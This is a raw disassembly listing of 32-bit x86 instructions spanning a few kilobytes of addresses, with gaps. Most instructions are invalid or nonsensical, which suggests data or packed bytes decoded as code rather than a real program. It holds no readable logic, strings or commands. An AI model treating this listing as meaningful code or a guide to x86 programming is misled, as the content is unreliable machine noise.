  422e6b:	mov    ah,0xc0
  422e6d:	inc    esp
  422e6e:	pop    edi
  422e6f:	popa   
  422e70:	pop    eax
  422e71:	test   DWORD PTR [edx+0x13],edx
  422e74:	and    DWORD PTR [ebx],ebp
  422e76:	push   edx
  422e77:	push   0x5751f9d1
  422e7c:	std    
  422e7d:	and    al,0xd9
  422e7f:	dec    esi
  422e80:	test   BYTE PTR [edi+0x60],dl
  422e83:	mov    ch,0x81
  422e85:	sbb    al,0xb0
  422e87:	lods   eax,DWORD PTR ds:[esi]
  422e88:	hlt    
  422e89:	outs   dx,BYTE PTR ds:[esi]
  422e8a:	mov    WORD PTR [ebx],es
  422e8c:	(bad)  
  422e8d:	xor    BYTE PTR [ecx+0x5e],ch
  422e90:	cmp    al,0x9d
  422e92:	stos   BYTE PTR es:[edi],al
  422e93:	push   ebx
  422e94:	repnz ror DWORD PTR [edi-0x22],1
  422e98:	fucomi st,st(5)
  422e9a:	in     al,dx
  422e9b:	stos   BYTE PTR es:[edi],al
  422e9c:	aas    
  422e9d:	push   es
  422e9e:	ins    BYTE PTR es:[edi],dx
  422e9f:	(bad)  
  422ea0:	mov    eax,0x5c504a1e
  422ea5:	nop
  422ea6:	mov    ah,0x58
  422ea8:	sub    ebp,DWORD PTR [eax+edi*1-0x49abac0f]
  422eaf:	mov    WORD PTR [eax+0x197e2a48],?
  422eb5:	ror    BYTE PTR ds:0xeefc7e43,0xb
  422ebc:	mov    esp,0x876fb652
  422ec1:	mov    bl,0xa5
  422ec3:	add    ebx,ebx
  422ec5:	dec    edi
  422ec6:	dec    ebx
  422ec7:	adc    eax,DWORD PTR [edx]
  422ec9:	dec    BYTE PTR [esi]
  422ecb:	dec    ecx
  422ecc:	inc    edi
  422ecd:	cmp    eax,0x6ca91258
  422ed2:	loope  0x422e74
  422ed4:	pop    eax
  422ed5:	xchg   esi,eax
  422ed6:	pop    ebp
  422ed7:	add    ecx,DWORD PTR [edi+edi*1-0x65d1fa92]
  422ede:	sub    DWORD PTR [ecx+edi*8+0x517d91d5],edx
  422ee5:	in     eax,dx
  422ee6:	xor    dh,BYTE PTR [edx+0x5f]
  422ee9:	mov    ebp,0x62f3f1
	...
  422f56:	adc    DWORD PTR [ebp-0x78],0x19
  422f5a:	(bad)  
  422f5c:	xchg   ebx,eax
  422f5d:	fisttp WORD PTR [eax]
  422f5f:	mov    eax,0x7107ca33
  422f64:	and    esp,ebp
  422f66:	(bad)  
  422f67:	jbe    0x422f6a
  422f69:	add    bh,bh
  422f6b:	add    BYTE PTR [eax],al
  422f6d:	add    BYTE PTR [ecx],bh
  422f6f:	inc    edi
  422f70:	jns    0x422f75
  422f72:	fldenv [ecx+0x0]
  422f75:	int3   
  422f76:	push   ebx
  422f77:	std    
  422f78:	pop    esi
  422f79:	mov    eax,DWORD PTR [esi+0x78]
  422f7c:	aad    0xfd
  422f7e:	int    0x8c
  422f80:	fiadd  WORD PTR [ebp+0x5496f118]
  422f86:	mov    WORD PTR [edi],fs
  422f88:	cmp    bl,bh
  422f8a:	not    edx
  422f8c:	jne    0x422f18
  422f8e:	retf   0x6d10
  422f91:	inc    esi
  422f92:	inc    ebp
  422f93:	repz push ss
  422f95:	in     eax,0x3c
  422f97:	inc    edx
  422f98:	jno    0x422fe3
  422f9a:	cmp    BYTE PTR [edi+0x27e837ed],0xd0
  422fa1:	mov    esp,0x9387ac8
  422fa6:	push   edi
  422fa7:	sti    
  422fa8:	ror    BYTE PTR [edi+0x2a],0x8c
  422fac:	stc    
  422fad:	sub    DWORD PTR [edi-0x7f7c3360],ecx
  422fb3:	mov    ah,0xac
  422fb5:	jno    0x422f88
  422fb7:	pop    esp
  422fb8:	mov    DWORD PTR [edi-0x58a9e632],0x4f9f9504
  422fc2:	push   edi
  422fc3:	inc    edi
  422fc4:	inc    ecx
  422fc5:	jb     0x422f8a
  422fc7:	jne    0x422f59
  422fc9:	xchg   ebp,eax
  422fca:	ins    DWORD PTR es:[edi],dx
  422fcb:	adc    al,0x7c
  422fcd:	pop    esp
  422fce:	out    dx,eax
  422fcf:	gs cdq 
  422fd1:	arpl   WORD PTR [ecx],cx
  422fd3:	mov    eax,ds:0x3c2053d0
  422fd8:	xchg   esi,eax
  422fd9:	lods   al,BYTE PTR ds:[esi]
  422fda:	je     0x422fcb
  422fdc:	xor    ah,ah
  422fde:	sub    ebx,DWORD PTR [ecx]
  422fe0:	xor    edx,DWORD PTR [edx-0x79]
  422fe3:	int    0x88
  422fe5:	rol    BYTE PTR [ebx],0xb0
  422fe8:	aad    0xe1
  422fea:	jmp    0x422fc5
  422fec:	pop    es
  422fed:	jns    0x422f98
  422fef:	mov    al,ds:0x13e2c91c
  422ff4:	in     eax,dx
  422ff5:	jae    0x423040
  422ff7:	stos   BYTE PTR es:[edi],al
  422ff8:	xchg   DWORD PTR [edx],ebx
  422ffa:	pop    ss
  422ffb:	mov    esi,0x6c5cb013
  423000:	push   edx
  423001:	sahf   
  423002:	je     0x422f9e
  423004:	pop    eax
  423005:	dec    edi
  423006:	ja     0x422fda
  423008:	in     al,0x79
  42300a:	mov    dl,0x42
  42300c:	sbb    ch,ch
  42300e:	push   ebp
  42300f:	jns    0x423032
  423011:	pop    esi
  423012:	popa   
  423013:	xor    eax,0x7f17b4fe
  423018:	sub    ecx,DWORD PTR [ecx]
  42301a:	adc    esi,ecx
  42301c:	push   ebp
  42301d:	pop    es
  42301e:	pop    esi
  42301f:	xchg   ecx,eax
  423020:	sbb    eax,0xff28306b
  423025:	and    DWORD PTR [ecx*8+0x3cc88319],ebp
  42302c:	add    DWORD PTR [edx+0x6e71fe0b],esp
  423032:	popf   
  423033:	xor    eax,0xd226fb4b
  423038:	cmp    DWORD PTR [ecx],esp
  42303a:	fstp   DWORD PTR [ecx]
  42303c:	jbe    0x4230ad
  42303e:	or     al,0x23
  423040:	sub    DWORD PTR ds:0x7da3f845,0xce4941eb
  42304a:	call   0x3390:0x57904636
  423051:	dec    ecx
  423052:	ins    DWORD PTR es:[edi],dx
  423053:	cmp    edi,DWORD PTR [edx]
  423055:	adc    BYTE PTR [edx+eiz*2-0x54f0da96],bl
  42305c:	xor    ebp,ebx
  42305e:	adc    esp,esp
  423060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423061:	fimul  DWORD PTR [ebx]
  423063:	cmp    ah,BYTE PTR [edi-0x4c3c4444]
  423069:	push   eax
  42306a:	and    edx,DWORD PTR [eax+0x5e]
	...
  4230d4:	add    BYTE PTR [eax],al
  4230d6:	inc    esi
  4230d7:	in     al,0x62
  4230d9:	mov    dl,ah
  4230db:	mov    gs,esi
  4230dd:	out    dx,al
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [esi+ebx*4-0x399178cb],esp
  4230e7:	ja     0x4230ea
  4230e9:	add    bh,bh
  4230eb:	add    BYTE PTR [eax],al
  4230ed:	add    BYTE PTR [esi+esi*4-0x63c07972],ch
  4230f4:	mov    eax,0x1ee4af9b
  4230f9:	pop    eax
  4230fa:	xlat   BYTE PTR ds:[ebx]
  4230fb:	(bad)  
  4230fc:	jmp    0xe710:0xdbe1f527
  423103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423104:	mov    ah,0x43
  423106:	out    dx,al
  423107:	xor    eax,0x4076eca4
  42310c:	add    esp,DWORD PTR [ebx+edx*4]
  42310f:	out    dx,al
  423110:	mov    esp,edi
  423112:	out    0x4c,al
  423114:	repnz xor ch,BYTE PTR [eax-0x3c9fc69d]
  42311b:	xlat   BYTE PTR ds:[ebx]
  42311c:	lea    edi,[ecx+0x42]
  42311f:	sar    BYTE PTR [edx-0x14],0x7f
  423123:	or     bl,BYTE PTR [ecx-0x2848d1d9]
  423129:	xor    eax,0xc5392277
  42312e:	shl    DWORD PTR [ecx-0x2a],0x25
  423132:	pop    ebx
  423133:	push   edx
  423134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423135:	jmp    0x423174
  423137:	outs   dx,BYTE PTR ds:[esi]
  423138:	push   ebx
  423139:	mov    edi,eax
  42313b:	data16 int 0x11
  42313e:	aaa    
  42313f:	xchg   ebx,eax
  423140:	mov    ecx,0xc8858011
  423145:	outs   dx,DWORD PTR ds:[esi]
  423146:	push   DWORD PTR [eax]
  423148:	add    eax,0x7b6f4db8
  42314d:	sub    esi,DWORD PTR [esp+edx*8-0x31]
  423151:	retf   
  423152:	adc    eax,0x74a8f43
  423157:	out    0xa5,al
  423159:	imul   esp,DWORD PTR [edi+0x52],0xad9749cc
  423160:	fsub   QWORD PTR fs:[ebx]
  423163:	jl     0x4231e1
  423165:	pop    eax
  423166:	cmp    eax,0xd3f54c13
  42316b:	sti    
  42316c:	xor    bl,dl
  42316e:	loope  0x4231c7
  423170:	xchg   esp,eax
  423171:	inc    ebp
  423172:	cmp    ecx,DWORD PTR [esi]
  423174:	sub    BYTE PTR [edi-0x4b],bh
  423177:	and    ah,ch
  423179:	xchg   edx,eax
  42317a:	dec    ebx
  42317b:	mov    edx,0x2591e20d
  423180:	mov    eax,0xbfc6e4be
  423185:	or     esi,DWORD PTR [edi]
  423187:	stos   DWORD PTR es:[edi],eax
  423188:	xchg   edi,eax
  423189:	clc    
  42318a:	fs and al,0x71
  42318d:	or     DWORD PTR [edi-0x2c808c77],esp
  423193:	pop    ds
  423194:	pop    eax
  423195:	xchg   edx,eax
  423196:	(bad)  
  423198:	test   eax,0xcba35af2
  42319d:	jno    0x4231e5
  42319f:	jg     0x423187
  4231a1:	vcmpsd xmm1,xmm2,QWORD PTR [edx+0x628d9e5f],0x8f
  4231aa:	sbb    esi,DWORD PTR [eax+0x11]
  4231ad:	jp     0x4231d0
  4231af:	in     al,dx
  4231b0:	add    al,BYTE PTR ds:0x6841dcab
  4231b6:	imul   eax,DWORD PTR [edx+0x5d865dba],0x4d
  4231bd:	jmp    0x4231ff
  4231bf:	aas    
  4231c0:	fbstp  TBYTE PTR [edx+0x46]
  4231c3:	in     eax,dx
  4231c4:	jb     0x42315c
  4231c6:	or     al,cl
  4231c8:	(bad)  
  4231c9:	repz scas eax,DWORD PTR es:[edi]
  4231cb:	repz xor ebx,DWORD PTR [esi]
  4231ce:	leave  
  4231cf:	dec    edi
  4231d0:	dec    esi
  4231d1:	inc    esi
  4231d2:	xor    BYTE PTR [edi+edi*2-0xb1afb61],cl
  4231d9:	sti    
  4231da:	int    0x1e
  4231dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231dd:	dec    ecx
  4231de:	scas   eax,DWORD PTR es:[edi]
  4231df:	retf   0xb950
  4231e2:	ror    ebx,0x9b
  4231e5:	and    esp,DWORD PTR [ebp-0x25a5f2d9]
  4231eb:	mov    ebp,0x90
	...
  423254:	add    BYTE PTR [eax],al
  423256:	jns    0x423249
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx+0x19ae58cd],esp
  423266:	lds    edi,FWORD PTR [eax+0x1]
  423269:	add    bh,bh
  42326b:	add    BYTE PTR [eax],al
  42326d:	add    BYTE PTR [ecx+0x74],ch
  423270:	mov    eax,0x76ae32a3
  423275:	xchg   ecx,eax
  423276:	cmp    bh,BYTE PTR [ebx]
  423278:	mov    eax,ds:0x92e0128b
  42327d:	mov    esp,0x8f949e78
  423282:	(bad)  
  423283:	ss push 0xe499ce58
  423289:	iret   
  42328a:	(bad)  
  42328b:	fisttp WORD PTR [edx-0x66]
  42328e:	mov    esp,0xb51d538d
  423293:	int3   
  423294:	pop    edx
  423295:	mov    al,ds:0x28c8e741
  42329a:	xor    cl,BYTE PTR [edi+0x54]
  42329d:	xchg   esi,eax
  42329e:	pop    ss
  42329f:	mov    fs,WORD PTR [esi]
  4232a1:	int3   
  4232a2:	or     BYTE PTR [esi-0xf4ba6c4],bl
  4232a8:	int    0x25
  4232aa:	les    esi,FWORD PTR [eax]
  4232ac:	or     BYTE PTR [edi+eiz*4+0x7c],cl
  4232b0:	xchg   edx,eax
  4232b1:	xchg   ebp,eax
  4232b2:	out    0xef,al
  4232b4:	sbb    DWORD PTR [ebx-0x3486e4d4],esp
  4232ba:	or     al,0x79
  4232bc:	cs dec esi
  4232be:	sahf   
  4232bf:	push   0x10
  4232c1:	jg     0x423327
  4232c3:	add    bh,BYTE PTR [ecx+edi*4+0x34cbf2cb]
  4232ca:	icebp  
  4232cb:	or     BYTE PTR [esi+ecx*8],al
  4232ce:	ins    BYTE PTR es:[edi],dx
  4232cf:	in     eax,0xfa
  4232d1:	pop    ss
  4232d2:	xchg   esi,eax
  4232d3:	and    al,0x29
  4232d5:	pop    ecx
  4232d6:	mov    edi,0x75334c00
  4232db:	int    0xa3
  4232dd:	aaa    
  4232de:	sti    
  4232df:	outs   dx,BYTE PTR ds:[esi]
  4232e0:	sahf   
  4232e1:	adc    BYTE PTR [ecx],bl
  4232e3:	adc    al,0xb2
  4232e5:	add    bh,BYTE PTR [eax]
  4232e7:	mov    eax,0x4b483254
  4232ec:	rcr    DWORD PTR [edx-0x76],cl
  4232ef:	adc    BYTE PTR [edi+0x2651a735],bl
  4232f5:	jecxz  0x423309
  4232f7:	pop    eax
  4232f8:	xlat   BYTE PTR ds:[ebx]
  4232f9:	loopne 0x4232df
  4232fb:	or     ah,bh
  4232fd:	outs   dx,BYTE PTR ds:[esi]
  4232fe:	addr16 push ds
  423300:	mov    esi,0x85e2dded
  423305:	mov    ch,0xa0
  423307:	dec    ecx
  423308:	pop    ss
  423309:	test   al,0xbd
  42330b:	dec    esp
  42330c:	lock jae 0x4232bc
  42330f:	int3   
  423310:	lahf   
  423311:	and    eax,0xe60daaf
  423316:	mov    eax,ds:0x751b05ad
  42331b:	jl     0x423341
  42331d:	push   ecx
  42331e:	mov    ebx,edx
  423320:	cmp    al,0xd6
  423322:	or     ecx,0x6e
  423325:	dec    edx
  423326:	test   BYTE PTR [edi],dl
  423328:	and    eax,0xbc7022f5
  42332d:	sub    dh,BYTE PTR [edx+0x30]
  423330:	push   edx
  423331:	stos   DWORD PTR es:[edi],eax
  423332:	dec    ebx
  423333:	cli    
  423334:	mov    ecx,DWORD PTR [edx]
  423336:	xor    ah,BYTE PTR [ebx+0x40916298]
  42333c:	mov    cl,0x1a
  42333e:	pushf  
  42333f:	cmp    DWORD PTR ds:0x1ab290f1,0x68d7d0b4
  423349:	mov    eax,ds:0x70ceab7
  42334e:	adc    BYTE PTR [ebx-0x7d5bd8d],bl
  423354:	mov    ebp,0xb7d8d8e3
  423359:	sar    ecx,cl
  42335b:	es sub al,0xe2
  42335e:	xlat   BYTE PTR ds:[ebx]
  42335f:	jae    0x423320
  423361:	aaa    
  423362:	mov    bh,0x8
  423364:	inc    edi
  423365:	xor    ch,al
  423367:	mov    es,WORD PTR [edx]
  423369:	inc    ecx
  42336a:	out    dx,eax
  42336b:	rol    ebx,1
	...
  4233d5:	add    al,bh
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0xe0c60f44
  4233e4:	mov    al,ds:0x179c4bb
  4233e9:	add    bh,bh
  4233eb:	add    BYTE PTR [eax],al
  4233ed:	add    BYTE PTR [ecx+0x5a],dh
  4233f0:	mov    eax,0x96b0e8fd
  4233f5:	call   0x5146:0x47a5b130
  4233fc:	(bad)  
  4233fd:	mov    ds:0x90676b26,eax
  423402:	sbb    eax,0x2f10233b
  423407:	mov    al,ah
  423409:	push   eax
  42340a:	pop    ebp
  42340b:	xor    DWORD PTR [edx-0x70],edi
  42340e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42340f:	div    ecx
  423411:	adc    bl,al
  423413:	outs   dx,BYTE PTR ds:[esi]
  423414:	inc    esp
  423415:	sub    BYTE PTR [edx-0x5a],ah
  423418:	dec    ebp
  423419:	jnp    0x4233fb
  42341b:	call   0x5fc040e2
  423420:	jp     0x423489
  423422:	jecxz  0x423409
  423424:	test   BYTE PTR ds:0x90293887,cl
  42342a:	cs inc ebp
  42342c:	mov    edi,0xe5095841
  423431:	scas   eax,DWORD PTR es:[edi]
  423432:	clc    
  423433:	je     0x423430
  423435:	sti    
  423436:	addr16 sub ebx,ebp
  423439:	inc    edx
  42343a:	push   cs
  42343b:	ja     0x42343f
  42343d:	js     0x4233c9
  42343f:	jmp    0x759a5092
  423444:	mov    ds:0x8caa5390,al
  423449:	pop    esp
  42344a:	cmp    al,0x8f
  42344c:	shr    DWORD PTR [esi+0x2e],1
  42344f:	sti    
  423450:	fistp  WORD PTR [eax+0x7ffc74e4]
  423456:	and    DWORD PTR [edi-0xdefa0fd],ecx
  42345c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42345d:	mov    bl,0x38
  42345f:	mov    ch,0xa0
  423461:	mov    al,0x38
  423463:	bound  ebp,QWORD PTR [edx-0x7bde569]
  423469:	adc    BYTE PTR [esi+0x12],0xc
  42346d:	repz sub al,0x69
  423470:	sbb    al,0xea
  423472:	ins    BYTE PTR es:[edi],dx
  423473:	add    eax,0x23326a54
  423478:	mov    esi,0x3ea78e39
  42347d:	ja     0x42344d
  42347f:	rol    DWORD PTR [ecx-0x39ad8ee4],0xf0
  423486:	stos   BYTE PTR es:[edi],al
  423487:	out    dx,al
  423488:	xchg   ebp,eax
  423489:	jae    0x423494
  42348b:	sub    edx,DWORD PTR [ebx-0x73]
  42348e:	(bad)  
  423490:	jp     0x4234bb
  423492:	push   ecx
  423493:	jbe    0x423464
  423495:	cmp    ebx,DWORD PTR [ecx-0x7c35fe75]
  42349b:	jmp    0x59551a0e
  4234a0:	out    dx,eax
  4234a1:	outs   dx,BYTE PTR ds:[esi]
  4234a2:	gs into 
  4234a4:	xchg   ebp,eax
  4234a5:	add    esp,DWORD PTR [eax-0x4eb2a292]
  4234ab:	inc    edx
  4234ac:	dec    eax
  4234ad:	mov    al,0x58
  4234af:	test   DWORD PTR [edi+0x5150c961],ecx
  4234b5:	scas   al,BYTE PTR es:[edi]
  4234b6:	pop    edx
  4234b7:	stos   BYTE PTR es:[edi],al
  4234b8:	mov    bh,0xc7
  4234ba:	hlt    
  4234bb:	jp     0x423535
  4234bd:	adc    eax,0xc830ed0f
  4234c2:	out    0xf9,eax
  4234c4:	clc    
  4234c5:	lea    edi,[esi+0x4e8ad956]
  4234cb:	je     0x4234db
  4234cd:	mov    ah,0xfc
  4234cf:	push   ss
  4234d0:	mov    es,WORD PTR [ebp*8+0x7b2f3c0d]
  4234d7:	jns    0x4234bc
  4234d9:	je     0x42346e
  4234db:	cmp    esp,DWORD PTR [eax+0x49e78260]
  4234e1:	add    ch,BYTE PTR [eax]
  4234e3:	imul   edx,DWORD PTR [edi-0x22227f8c],0x3ba136ae
	...
  423555:	add    al,al
  423557:	mov    al,0x45
  423559:	outs   dx,DWORD PTR ds:[esi]
  42355a:	jne    0x42355b
  42355c:	jmp    0x491f:0xadf467bf
  423563:	mov    esp,0x7ac3c1ae
  423568:	add    DWORD PTR [eax],eax
  42356a:	inc    DWORD PTR [eax]
  42356c:	add    BYTE PTR [eax],al
  42356e:	iret   
  42356f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423570:	pop    esi
  423571:	fmul   DWORD PTR [ebx-0x65]
  423574:	push   esp
  423575:	pop    esp
  423576:	xchg   DWORD PTR [eax+0x6732ae4f],edi
  42357c:	mov    ch,0x63
  42357e:	xor    BYTE PTR [eax],dl
  423580:	mov    esi,0x8ca4dc3
  423585:	mov    bh,0xdc
  423587:	push   ds
  423588:	dec    edx
  423589:	or     BYTE PTR [ebx+0x4d],cl
  42358c:	inc    eax
  42358d:	arpl   WORD PTR [ebx-0x63742da5],ax
  423593:	adc    eax,0x5d6d7c6b
  423598:	inc    esp
  423599:	stos   BYTE PTR es:[edi],al
  42359a:	mov    eax,0x3fdddfab
  42359f:	push   cs
  4235a0:	jne    0x4235b3
  4235a2:	mov    edx,0xa317a365
  4235a7:	mov    ecx,0x369f0eae
  4235ac:	ret    
  4235ad:	mov    ds:0x9775053d,al
  4235b2:	and    al,0x56
  4235b4:	call   0xcd79:0x5994e183
  4235bb:	mov    dl,0xbe
  4235bd:	jnp    0x42360d
  4235bf:	(bad)  
  4235c0:	cmp    al,bh
  4235c2:	adc    ebp,DWORD PTR [eax+0x326f5259]
  4235c8:	aas    
  4235c9:	pusha  
  4235ca:	into   
  4235cb:	aaa    
  4235cc:	ins    BYTE PTR es:[edi],dx
  4235cd:	nop
  4235ce:	hlt    
  4235cf:	inc    eax
  4235d0:	repz push eax
  4235d2:	pop    edx
  4235d3:	mov    eax,0xaf31c1f0
  4235d8:	hlt    
  4235d9:	(bad)  
  4235da:	sbb    al,0xe
  4235dc:	cs (bad) 
  4235e0:	push   esi
  4235e1:	out    0x5e,eax
  4235e3:	add    eax,0x445c42ed
  4235e8:	sub    al,0xf5
  4235ea:	cmp    eax,0xdce5f317
  4235ef:	xor    al,0x8d
  4235f1:	js     0x4235d7
  4235f3:	xlat   BYTE PTR ds:[ebx]
  4235f4:	push   eax
  4235f5:	stos   BYTE PTR es:[edi],al
  4235f6:	hlt    
  4235f7:	retf   
  4235f8:	jl     0x4235c6
  4235fa:	xor    bl,BYTE PTR [edi-0x2c]
  4235fd:	outs   dx,DWORD PTR ds:[esi]
  4235fe:	retf   
  4235ff:	inc    esi
  423600:	daa    
  423601:	xchg   ebx,eax
  423602:	retf   0x839c
  423605:	loopne 0x423666
  423607:	and    cl,al
  423609:	aam    0xca
  42360b:	jmp    0xa028e12c
  423610:	(bad)  
  423611:	xor    al,0x2
  423613:	pop    esi
  423614:	push   ebx
  423615:	into   
  423616:	sar    BYTE PTR [eax-0x809dc76],cl
  42361c:	fnsave [edi]
  42361e:	aad    0xc3
  423620:	dec    ecx
  423621:	fimul  WORD PTR [esi]
  423623:	push   0xdc7b27b3
  423628:	mov    bl,0x44
  42362a:	push   ds
  42362b:	or     eax,0xa274066f
  423630:	cmp    bl,0x99
  423633:	(bad)  [ebx-0x24c15d55]
  423639:	rcr    BYTE PTR [ebx+0x50],cl
  42363c:	inc    ecx
  42363d:	call   0x32c0ad4a
  423642:	cdq    
  423643:	dec    eax
  423644:	and    bh,BYTE PTR [ebx]
  423646:	xchg   esi,eax
  423647:	retf   
  423648:	xor    DWORD PTR [esi],0x1e
  42364b:	pop    edx
  42364c:	inc    ebx
  42364d:	mov    WORD PTR [esi-0x5f386eb4],?
  423653:	sub    edx,DWORD PTR [esi+0x7945c066]
  423659:	and    al,0xfe
  42365b:	sub    al,0x3c
  42365d:	dec    esp
  42365e:	test   DWORD PTR [edx+0x4f9b7488],ebp
  423664:	push   edi
  423665:	lods   eax,DWORD PTR ds:[esi]
  423666:	xor    DWORD PTR [edi],ebp
  423668:	int    0xd5
  42366a:	popf   
  42366b:	inc    ebx
  42366c:	pop    esi
	...
  4236d5:	add    BYTE PTR [eax+0x7f747c8f],al
  4236db:	test   DWORD PTR [eax+0x7c916eff],0xeb588513
  4236e5:	xor    dl,al
  4236e7:	jnp    0x4236ea
  4236e9:	add    bh,bh
  4236eb:	add    BYTE PTR [eax],al
  4236ed:	add    BYTE PTR [edx],ch
  4236ef:	pextrw edi,(bad),0xc5
  4236f1:	aas    
  4236f2:	adc    DWORD PTR [edx+0x177e4b7d],ecx
  4236f8:	fwait
  4236f9:	dec    ebx
  4236fa:	jbe    0x42372e
  4236fc:	adc    dh,bh
  4236fe:	sahf   
  4236ff:	fldenv [edx]
  423701:	(bad)  
  423702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423703:	xor    BYTE PTR [eax-0x4c],ch
  423706:	bound  esi,QWORD PTR [eax+0xb650b87]
  42370c:	xchg   BYTE PTR [edi],dl
  42370e:	sub    BYTE PTR [ecx-0xb48f2aa],dl
  423714:	outs   dx,DWORD PTR ds:[esi]
  423715:	pop    eax
  423716:	sub    BYTE PTR [ecx],al
  423718:	into   
  423719:	adc    edx,esp
  42371b:	ins    BYTE PTR es:[edi],dx
  42371c:	cmp    al,0x7f
  42371e:	scas   al,BYTE PTR es:[edi]
  42371f:	pop    ebp
  423720:	pushf  
  423721:	push   cs
  423722:	push   ss
  423723:	xchg   esp,eax
  423724:	sbb    al,0x47
  423726:	jno    0x42371e
  423728:	int    0xc6
  42372a:	sbb    ebx,DWORD PTR [esi*2-0x4e7b8cfc]
  423731:	lds    esp,FWORD PTR [ebp+0x75dcf996]
  423737:	sub    DWORD PTR [edi+ebx*2-0x42],0x806ed5c3
  42373f:	or     eax,0xc066d37f
  423744:	add    al,0xe8
  423746:	push   ebx
  423747:	sub    ebp,DWORD PTR [edx+edi*8]
  42374a:	sbb    cl,BYTE PTR [ebx+ecx*2-0x27abeea1]
  423751:	jo     0x423721
  423753:	out    0x92,eax
  423755:	sub    BYTE PTR [ebx],al
  423757:	jno    0x4236e3
  423759:	cs ins BYTE PTR es:[edi],dx
  42375b:	mov    ds:0xb3e164b6,eax
  423760:	out    0xef,eax
  423762:	sbb    ebx,0x2b
  423765:	sbb    al,bh
  423767:	pop    esp
  423768:	stos   BYTE PTR es:[edi],al
  423769:	xchg   ebp,eax
  42376a:	es cld 
  42376c:	jns    0x4237cf
  42376e:	pop    esp
  42376f:	inc    DWORD PTR [eax-0x60]
  423772:	xchg   esi,eax
  423773:	mov    ch,0xb6
  423775:	test   BYTE PTR [ecx],0x4d
  423778:	sbb    BYTE PTR [edi+0x2b],0x15
  42377c:	(bad)  
  42377d:	repz mov cl,0x4a
  423780:	dec    edi
  423781:	add    al,0x28
  423783:	iret   
  423784:	adc    ah,cl
  423786:	xchg   esp,eax
  423787:	icebp  
  423788:	ret    0x2627
  42378b:	in     al,dx
  42378c:	adc    bh,bl
  42378e:	inc    ebp
  42378f:	pusha  
  423790:	mov    ebp,0x11e2580a
  423795:	lods   eax,DWORD PTR ds:[esi]
  423796:	test   bl,0x71
  423799:	adc    eax,0x8aff611
  42379e:	int3   
  42379f:	int    0x84
  4237a1:	jecxz  0x42377b
  4237a3:	fidivr WORD PTR [ebx+0x3a792312]
  4237a9:	out    0x9f,al
  4237ab:	pop    edx
  4237ac:	add    eax,DWORD PTR [edi]
  4237ae:	cdq    
  4237af:	xor    ebp,0xb6e0a1ca
  4237b5:	mov    eax,0xeeb4e13
  4237ba:	pop    ds
  4237bb:	in     eax,0x41
  4237bd:	jecxz  0x4237fa
  4237bf:	jae    0x42380b
  4237c1:	jle    0x4237f7
  4237c3:	pop    edi
  4237c4:	cwde   
  4237c5:	sar    DWORD PTR [eax],cl
  4237c7:	stos   BYTE PTR es:[edi],al
  4237c8:	outs   dx,DWORD PTR ds:[esi]
  4237c9:	or     cl,bh
  4237cb:	sbb    DWORD PTR [esi+0x5e702d68],eax
  4237d1:	dec    ebx
  4237d2:	sahf   
  4237d3:	and    ah,ch
  4237d5:	hlt    
  4237d6:	shl    bl,1
  4237d8:	in     al,dx
  4237d9:	jp     0x423768
  4237db:	adc    eax,0x50722d54
  4237e0:	cmp    ch,cl
  4237e2:	aad    0x6f
  4237e4:	jb     0x423785
  4237e6:	sub    eax,0xc03bf882
  4237eb:	mov    ebx,0x18
	...
  423854:	add    BYTE PTR [eax],al
  423856:	xor    al,0x23
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7cc1:0xb2f9ec5b
  423868:	add    DWORD PTR [eax],eax
  42386a:	inc    DWORD PTR [eax]
  42386c:	add    BYTE PTR [eax],al
  42386e:	xchg   ecx,eax
  42386f:	out    dx,eax
  423870:	out    dx,eax
  423871:	pop    ss
  423872:	loope  0x4238d7
  423874:	sbb    al,0x75
  423876:	jmp    0xbda5a340
  42387b:	mov    edi,0x93057b24
  423880:	out    dx,eax
  423881:	nop
  423882:	adc    BYTE PTR [ebx],dh
  423884:	test   al,0x90
  423886:	pop    ss
  423887:	enter  0xfc24,0x34
  42388b:	dec    esi
  42388c:	clc    
  42388d:	adc    BYTE PTR [eax+0x358735ba],bh
  423893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423894:	in     al,dx
  423895:	ja     0x42389e
  423897:	fisttp WORD PTR [ebp+0x69]
  42389a:	in     al,0x28
  42389c:	bound  edi,QWORD PTR [ebx+edx*8]
  42389f:	cmp    al,0x27
  4238a1:	sub    DWORD PTR [edi],ebx
  4238a3:	retf   0x3056
  4238a6:	adc    ebx,ebx
  4238a8:	mov    edx,0x5b251097
  4238ad:	xchg   edx,eax
  4238ae:	mov    ecx,0x2245ade7
  4238b3:	ror    bh,cl
  4238b5:	xchg   esi,eax
  4238b6:	fcmovnb st,st(2)
  4238b8:	cmp    BYTE PTR [ebx+0x5b],0x40
  4238bc:	or     eax,0xce1b3657
  4238c1:	(bad)  
  4238c2:	jmp    0x423852
  4238c4:	mov    eax,0x2f4565f2
  4238c9:	inc    edx
  4238ca:	cmp    bl,bh
  4238cc:	popf   
  4238cd:	test   DWORD PTR [ecx+0xe],0x584a908b
  4238d4:	retf   
  4238d5:	add    cl,BYTE PTR [edi]
  4238d7:	jmp    0x32954c34
  4238dc:	dec    ebx
  4238dd:	test   al,0x7f
  4238df:	fmul   QWORD PTR [edx-0x2ae2fdb]
  4238e5:	lea    edx,[ecx]
  4238e7:	addr16 repnz stc 
  4238ea:	mov    ecx,0xca9b5d1e
  4238ef:	icebp  
  4238f0:	inc    esp
  4238f1:	xchg   ebx,eax
  4238f2:	sub    cl,ah
  4238f4:	xchg   esi,eax
  4238f5:	inc    ecx
  4238f6:	sbb    BYTE PTR [edi+0x25],dh
  4238f9:	mov    bl,0xdb
  4238fb:	mov    edi,0xcb92f0c5
  423900:	in     al,dx
